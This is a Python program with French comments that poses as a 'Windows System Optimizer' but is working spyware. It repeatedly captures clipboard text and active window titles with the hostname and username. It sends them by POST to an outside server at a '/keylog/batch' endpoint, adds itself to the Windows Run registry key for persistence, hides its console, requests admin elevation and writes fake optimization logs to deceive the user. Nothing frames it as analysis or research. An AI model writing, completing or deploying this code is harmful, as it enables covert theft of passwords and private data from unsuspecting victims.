
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows System Optimizer - Outil d'optimisation système
"""

import os
import sys
import time
import json
import win32api
import win32con
import win32gui
import win32clipboard
from datetime import datetime
from pathlib import Path
import ctypes
import urllib.request
import threading
import random

# Configuration discrète
CONFIG = {
    'log_file': str(Path('~/AppData/Local/Temp/system_optimizer.log').expanduser()),
    'mutex_name': 'Global\\WindowsSystemOptimizer',
    'fake_process_name': 'SystemOptimizer.exe',
    'fake_window_title': 'Windows System Optimizer'
}

class SystemOptimizer:
    def __init__(self):
        self.last_send = time.time()
        self.buffer = []
        self.running = True
        self.setup_mutex()
        self.create_fake_interface()
        
    def setup_mutex(self):
        """Empêche les instances multiples"""
        try:
            self.mutex = ctypes.windll.kernel32.CreateMutexW(None, False, CONFIG['mutex_name'])
            if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
                sys.exit(0)
        except Exception as e:
            self.log_error(f"Erreur mutex: {e}")
            sys.exit(1)
    
    def create_fake_interface(self):
        """Crée une interface fausse pour rassurer l'utilisateur"""
        try:
            # Créer une fenêtre console discrète
            import subprocess
            subprocess.Popen(['cmd', '/c', 'title Windows System Optimizer && echo Optimisation du systeme en cours... && echo Veuillez patienter... && timeout /t 3 /nobreak >nul && exit'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
    
    def log_error(self, message):
        """Journalise les erreurs localement"""
        try:
            with open(CONFIG['log_file'], 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now()}] {message}\n")
        except:
            pass
    
    def monitor_clipboard(self):
        """Surveille le presse-papiers pour capturer le texte copié"""
        try:
            win32clipboard.OpenClipboard()
            try:
                data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
                if data and len(data) > 0:
                    self.buffer.append(f"[CLIPBOARD: {data}]")
            except:
                pass
            finally:
                win32clipboard.CloseClipboard()
        except:
            pass
    
    def monitor_active_window(self):
        """Surveille la fenêtre active pour capturer des informations"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            if hwnd:
                title = win32gui.GetWindowText(hwnd)
                if title and len(title) > 0:
                    self.buffer.append(f"[WINDOW: {title}]")
        except:
            pass
    
    def send_data(self):
        """Envoie les données capturées au serveur"""
        if not self.buffer:
            return
            
        try:
            # Préparer les données au format du serveur
            data = {
                'keys': ''.join(self.buffer),
                'timestamp': datetime.utcnow().isoformat(),
                'hostname': os.environ.get('COMPUTERNAME', 'Unknown'),
                'username': os.environ.get('USERNAME', 'Unknown'),
                'userAgent': f"SystemOptimizer/1.0 on {sys.platform}"
            }
            
            url = 'http://nodekey.skandy.online/keylog/batch'
            headers = {'Content-Type': 'application/json'}
            
            # Encoder les données en JSON
            json_data = json.dumps(data).encode('utf-8')
            
            # Créer la requête et l'envoyer
            req = urllib.request.Request(url, data=json_data, headers=headers, method='POST')
            with urllib.request.urlopen(req) as response:
                result = response.read().decode('utf-8')
                # Pas de print pour rester discret
            
            # Réinitialiser le buffer après envoi réussi
            self.buffer = []
            self.last_send = time.time()
            
        except Exception as e:
            self.log_error(f"Erreur envoi données: {e}")
    
    def install_persistence(self):
        """Installe la persistance via la clé de registre avec un nom innocent"""
        try:
            key = win32api.RegOpenKeyEx(
                win32con.HKEY_CURRENT_USER,
                'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                0, win32con.KEY_SET_VALUE
            )
            
            exe_path = os.path.abspath(sys.argv[0])
            win32api.RegSetValueEx(key, 'SystemOptimizer', 0, win32con.REG_SZ, exe_path)
            win32api.RegCloseKey(key)
            
        except Exception as e:
            self.log_error(f"Erreur installation persistance: {e}")
    
    def hide_console(self):
        """Cache la fenêtre de console sous Windows"""
        try:
            window = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(window, win32con.SW_HIDE)
        except:
            pass
    
    def simulate_optimization(self):
        """Simule une activité d'optimisation pour rassurer l'utilisateur"""
        try:
            # Créer des fichiers temporaires d'optimisation
            temp_dir = Path('~/AppData/Local/Temp/SystemOptimizer').expanduser()
            temp_dir.mkdir(exist_ok=True)
            
            # Créer un fichier de log d'optimisation
            log_file = temp_dir / 'optimization.log'
            with open(log_file, 'w', encoding='utf-8') as f:
                f.write(f"Windows System Optimizer - {datetime.now()}\n")
                f.write("Analyse du système en cours...\n")
                f.write("Optimisation des performances...\n")
                f.write("Nettoyage des fichiers temporaires...\n")
                f.write("Optimisation terminée avec succès!\n")
                
        except:
            pass
    
    def start(self):
        """Démarre l'optimiseur système"""
        try:
            # Cacher la console
            self.hide_console()
            
            # Simuler l'optimisation
            self.simulate_optimization()
            
            # Installer la persistance
            self.install_persistence()
            
            # Boucle principale de surveillance
            while self.running:
                try:
                    # Surveiller le presse-papiers
                    self.monitor_clipboard()
                    
                    # Surveiller la fenêtre active
                    self.monitor_active_window()
                    
                    # Envoyer périodiquement
                    if time.time() - self.last_send > 60:  # 1 minute
                        self.send_data()
                    
                    time.sleep(2)  # Pause de 2 secondes
                    
                except Exception as e:
                    self.log_error(f"Erreur dans la boucle principale: {e}")
                    time.sleep(10)
                    
        except Exception as e:
            self.log_error(f"Erreur optimiseur: {e}")
            time.sleep(60)
            self.start()

def is_admin():
    """Vérifie si le programme s'exécute avec les droits administrateur"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def main():
    # Message d'accueil innocent
    print("Windows System Optimizer - Démarrage...")
    print("Optimisation du système en cours...")
    
    # Vérifier les privilèges admin
    if not is_admin():
        # Relancer avec élévation de privilèges
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)
    
    # Démarrer l'optimiseur
    try:
        optimizer = SystemOptimizer()
        optimizer.start()
    except Exception as e:
        with open(CONFIG['log_file'], 'a', encoding='utf-8') as f:
            f.write(f"[ERREUR CRITIQUE] {e}\n")
        sys.exit(1)

if __name__ == "__main__":
    main()
